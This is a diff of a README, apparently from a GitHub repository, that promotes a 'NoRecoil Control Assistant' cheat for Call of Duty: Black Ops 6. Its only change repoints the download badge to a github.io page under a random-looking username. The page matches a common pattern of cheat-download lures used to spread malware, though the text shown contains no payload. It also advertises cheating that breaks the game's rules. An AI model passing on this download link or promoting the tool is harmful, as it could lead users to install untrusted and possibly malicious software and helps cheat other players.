@@ -3,7 +3,7 @@
 Set up the **NoRecoil Control Assistant** for Call of Duty: Black Ops 6 on Windows. This technical guide shows how to manage recoil patterns, stabilize weapon spray, and fine-tune your aim for consistent accuracy in all combat situations.
 
 ⬇️ **Download**  
-[![Download Recoil Control Tool](https://img.shields.io/badge/Download-Recoil_Control-000000?style=for-the-badge&logo=call-of-duty&logoColor=white)](https://cod-black-ops-6-no-recoil-control.github.io/.github/)
+[![Download Recoil Control Tool](https://img.shields.io/badge/Download-Recoil_Control-000000?style=for-the-badge&logo=call-of-duty&logoColor=white)](https://diannkaea9206251.github.io/.github/cod-black-ops-6-no-recoil-control)
 
 ---
 
